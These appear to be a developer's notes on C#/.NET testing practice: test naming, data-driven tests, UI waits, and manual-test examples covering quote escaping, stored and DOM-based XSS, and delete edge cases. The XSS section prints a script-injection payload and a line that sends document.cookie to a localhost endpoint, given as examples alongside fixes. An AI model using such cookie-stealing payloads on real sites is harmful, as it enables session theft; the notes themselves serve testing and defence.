# Writing Test Script
- API test do not contains business logic, only CRUD
- Integration test is testing business logic with database
- Unit test is testing business logic without database
- **Handle exception**
	- [[#Test script for catching ExpectedException]]
	- Precise assert message: [[Code Review handbook#Straight Forward Error Message]]
- **Naming** convension
	- `Action_Scenario_Result`
	- `Copy_DossierHasAFolderWithSameDocumentType_SkipCopyFolder`

# Integration Test
## Write data-driven test
- **Avoid duplication** of test scripts, reuse function by passing different parameters
- **Improve maintenance**, clean code, easy to read
- **Comprehensive testing**, ensure all possible input combination are tested.

**Pseudocode for data-driven test**
```text
for each (username, password) in testData:
    openLoginPage()
    enterUsername(username)
    enterPassword(password)
    clickLoginButton()
    verifyLoginResult()
```

**3 ways to do in C# or .Net Framework**
- [[DataRow]] 
- `DynamicData`
- `XMLDataSource`

---
# Regression Test
- Check history
	- if failed before, find the PR causing this
- Reproduce in local
	- if success, test ok
	- if failed, test need to be fixed, take out from RRT first.
# Manual Testing
- Form
	- [[#Special Characters in Text Input]]
	- [[#Cross-Site Scripting (XSS)]]
	- [[#Delete with similar properties]]
- Design scenarios
	- [[#Validate core business logic]]
	- Delete & create the same again. This make sure "delete" action is doing well

**Testing in exactonline**
- 

---
# UI Test
## Wait for page
- Static: fix 10 seconds
- Dynamic: up to 10 seconds, if element not found, throw an exception
```cs
// Static
Page.Wait("Page", 10)
// Dynamic
Validator.WaitForExistId("Page", "refreshBtn", 10)
```


---
# Example
## Special Characters in Text Input (' " $ % @ ^ & :  / \ )

**What developer write**
```cs
private string GetPersonalNotePopupLink() {
	// vars & logic
	return $"CreatePopUpElementAndLink('{popUpWindowId}', '{title}', '{url}')";
}
```
**What HTML rendered**
```html
<a onlick="CreatePopUpElementAndLink('id', 'Sam's Title', 'http://localhost')" />
```

==Solution== **Escape the value in C#**
```cs
```csharp
using System.Web;

string title = "Sam's Title";
string escapedValue = HttpUtility.JavaScriptStringEncode(title);
```

---
##  Cross-Site Scripting (XSS)
### Stored XSS
Tester write a profile description with malicious script:
```
http:localhost?name=<script>alert('XXS attack!⚔️');</script>
```

```
<script>new Image().src="http://localhost/cookie.html?c="+document.cookie;</script>"
```

- When other people open his profile, they will see the alert.
- ==Solution== Input validation, output encoding, HTML sanitization. 
	- Modern framework will handle behind the scene. 

### DOM-based XSS
Include malicious script in request query: 
```
http:localhost?name=<script>alert('XXS attack!⚔️');</script>
```

---

## Delete with similar properties
**Example scenario: Deleted item still have duplicate ID**
- I have a feature that sync across my app and customer's SharePoint
- I create a document and it has synced
- Then, delete the document , also synced
- Then, create again. Bomb💣, an error state "Cannot store more than one attachment in a document ID"

**Another example: Forget to unlink foreign key**
- I have two customer, they have relationship called: "Involved user"
- They are link together, but I am going to delete one of it
- If database keep the relationship, you hit SQL error when you delete the 2nd customer.

---

## Validate core business logic
**Example: "Copy template" function is broken when "Sync" function involved**
- "Copy template" has protected by unit test
- But its functionality still get impacted
	- Business logic: Copy folder to all dossiers in same folder structure
	- New feature come to impact: Sync dossier to SharePoint
	- How is the impact: the feature changes to folder structure, so cannot copy correctly

---

## Test script for catching ExpectedException
Test to catch exception, no need assert. 
```cs
[TestMethod, ExpectedException(typeof(ERValidationException))]
// function { Arrange, Act } 
// no need Assert
```

---





